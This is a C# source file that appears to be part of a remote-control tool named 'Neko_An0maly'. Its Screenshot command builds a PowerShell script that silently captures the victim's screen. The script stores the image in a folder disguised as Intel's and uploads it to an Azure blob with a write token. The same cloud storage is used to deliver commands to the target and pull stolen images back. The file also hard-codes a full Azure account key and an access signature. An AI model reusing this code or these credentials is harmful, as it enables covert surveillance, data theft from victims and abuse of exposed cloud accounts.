using System;
using System.IO;
using System.Text;
using Microsoft.WindowsAzure.Storage;
using Microsoft.WindowsAzure.Storage.Blob;
using System.Threading;

namespace Neko_An0maly.Commands
{
    public class Screenshot : Command
    {
        public static string path = @"C:\ProgramData\";
        public Screenshot(string name) : base(name) { }

        public override string execute(string[] args)
        {
            if (args.Length == 1)
            {
                Console.WriteLine("Initializing command to be sent.");

                string fileName = args[0] + ".ps1";
                string finalPath = path + fileName;
                using (FileStream fs = File.Create(finalPath))
                {
                    byte[] line1 = new UTF8Encoding(true).GetBytes("[Reflection.Assembly]::LoadWithPartialName("+ (char)34 +"System.Drawing"+ (char)34 + ")");
                    fs.Write(line1, 0, line1.Length);
                    byte[] line2 = new UTF8Encoding(true).GetBytes("\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {");
                    fs.Write(line2, 0, line2.Length);
                    byte[] line3 = new UTF8Encoding(true).GetBytes("\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height");
                    fs.Write(line3, 0, line3.Length);
                    byte[] line4 = new UTF8Encoding(true).GetBytes("\n   $graphics = [Drawing.Graphics]::FromImage($bmp)");
                    fs.Write(line4, 0, line4.Length);
                    byte[] line5 = new UTF8Encoding(true).GetBytes("\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)");
                    fs.Write(line5, 0, line5.Length);
                    byte[] line6 = new UTF8Encoding(true).GetBytes("\n   $bmp.Save($path)");
                    fs.Write(line6, 0, line6.Length);
                    byte[] line7 = new UTF8Encoding(true).GetBytes("\n   $graphics.Dispose()");
                    fs.Write(line7, 0, line7.Length);
                    byte[] line8 = new UTF8Encoding(true).GetBytes("\n   $bmp.Dispose()");
                    fs.Write(line8, 0, line8.Length);
                    byte[] line9 = new UTF8Encoding(true).GetBytes("\n}");
                    fs.Write(line9, 0, line9.Length);
                    byte[] line10 = new UTF8Encoding(true).GetBytes("\n$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900)");
                    fs.Write(line10, 0, line10.Length);
                    byte[] line11 = new UTF8Encoding(true).GetBytes("\n$file = " + (char)34 + @"C:\ProgramData\Intel Corporation\ss.png" + (char)34);
                    fs.Write(line11, 0, line11.Length);
                    byte[] line12 = new UTF8Encoding(true).GetBytes("\nscreenshot $bounds $file");
                    fs.Write(line12, 0, line12.Length);
                    //byte[] line13 = new UTF8Encoding(true).GetBytes("\nStart-Sleep -Seconds 5");
                    //fs.Write(line13, 0, line13.Length);
                    byte[] line14 = new UTF8Encoding(true).GetBytes("\n$name = (Get-Item $file).Name");
                    fs.Write(line14, 0, line14.Length);
                    byte[] line15 = new UTF8Encoding(true).GetBytes("\n$uri = " + (char)34 + "https://previewps.blob.core.windows.net/data/$($name)?sv=2020-08-04&ss=bfqt&srt=sco&sp=rwdlacupitfx&se=2023-04-12T05:55:16Z&st=2021-11-23T21:55:16Z&spr=https,http&sig=YkdxIMDKKrObLdkUq9kOX5nosPDodaw4w6MIt4V64wo%3D" + (char)34);
                    fs.Write(line15, 0, line15.Length);
                    byte[] line16 = new UTF8Encoding(true).GetBytes("\n$headers = @{");
                    fs.Write(line16, 0, line16.Length);
                    byte[] line17 = new UTF8Encoding(true).GetBytes("\n" + @"    'x-ms-blob-type' = 'BlockBlob'");
                    fs.Write(line17, 0, line17.Length);
                    byte[] line18 = new UTF8Encoding(true).GetBytes("\n}");
                    fs.Write(line18, 0, line18.Length);
                    byte[] line19 = new UTF8Encoding(true).GetBytes("\nInvoke-RestMethod -Uri $uri -Method Put -Headers $headers -InFile $file");
                    fs.Write(line19, 0, line19.Length);
                    byte[] line20 = new UTF8Encoding(true).GetBytes("\nRename-Item $file");
                    fs.Write(line20, 0, line20.Length);
                }

                Console.WriteLine("Initializing upload.");

                upload(finalPath);
                download(path);
                check();

                return "";
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid arguments for 'screenshot'. Requires 1 argument(s) or more.");
                Console.ForegroundColor = ConsoleColor.White;
                return "Invalid arguments for 'screenshot'. Requires 1 argument(s) or more.";
            }
        }

        public void upload(string fileToUpload)
        {
            string file_extension,
            filename_withExtension,
            storageAccount_connectionString;
            Stream file;
            string azure_ContainerName = "ftp";

            storageAccount_connectionString = "DefaultEndpointsProtocol=https;AccountName=previewps;AccountKey=Io326GO+TGJpd8yBh1LzSDDRc6vdWV81O6Ntkc/SJOYHe4NA6IlxUOPrJjycEM8uAEWZu2XkZ5LUDTymfRGIsw==;EndpointSuffix=core.windows.net"; ;

            file = new FileStream(fileToUpload, FileMode.Open);

            CloudStorageAccount mycloudStorageAccount = CloudStorageAccount.Parse(storageAccount_connectionString);
            CloudBlobClient blobClient = mycloudStorageAccount.CreateCloudBlobClient();
            CloudBlobContainer container = blobClient.GetContainerReference(azure_ContainerName);

            if (container.CreateIfNotExists())
            {

                container.SetPermissionsAsync(new BlobContainerPermissions
                {
                    PublicAccess =
                  BlobContainerPublicAccessType.Blob
                });

            }

            file_extension = Path.GetExtension(fileToUpload);
            filename_withExtension = Path.GetFileName(fileToUpload);

            CloudBlockBlob cloudBlockBlob = container.GetBlockBlobReference(filename_withExtension);
            cloudBlockBlob.Properties.ContentType = file_extension;

            cloudBlockBlob.UploadFromStreamAsync(file);

            Console.WriteLine("Upload Completed.");
            Console.WriteLine("Thread sleeping for 9s.");

            Thread.Sleep(9000);

            Console.WriteLine("Deleting command to prevent looping.");
            cloudBlockBlob.DeleteIfExists();
            file.Dispose();
        }

        public static void download(string downloadLocation)
        {
            string filetoDownload = "ss.png";
            string azure_ContainerName = "data";

            string storageAccount_connectionString = "DefaultEndpointsProtocol=https;AccountName=previewps;AccountKey=Io326GO+TGJpd8yBh1LzSDDRc6vdWV81O6Ntkc/SJOYHe4NA6IlxUOPrJjycEM8uAEWZu2XkZ5LUDTymfRGIsw==;EndpointSuffix=core.windows.net";

            CloudStorageAccount mycloudStorageAccount = CloudStorageAccount.Parse(storageAccount_connectionString);
            CloudBlobClient blobClient = mycloudStorageAccount.CreateCloudBlobClient();

            CloudBlobContainer container = blobClient.GetContainerReference(azure_ContainerName);
            CloudBlockBlob cloudBlockBlob = container.GetBlockBlobReference(filetoDownload);

            if (cloudBlockBlob.Exists())
            {
                Stream file = File.OpenWrite(downloadLocation + filetoDownload);
                cloudBlockBlob.DownloadToStream(file);
                cloudBlockBlob.DeleteIfExists();
                file.Dispose();
            }
        }

        public static void check()
        {
            if (!File.Exists(path + "ss.png"))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("File not received!");
                Console.ForegroundColor = ConsoleColor.White;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("File received!");
                Console.ForegroundColor = ConsoleColor.White;

            }
        }
    }
}
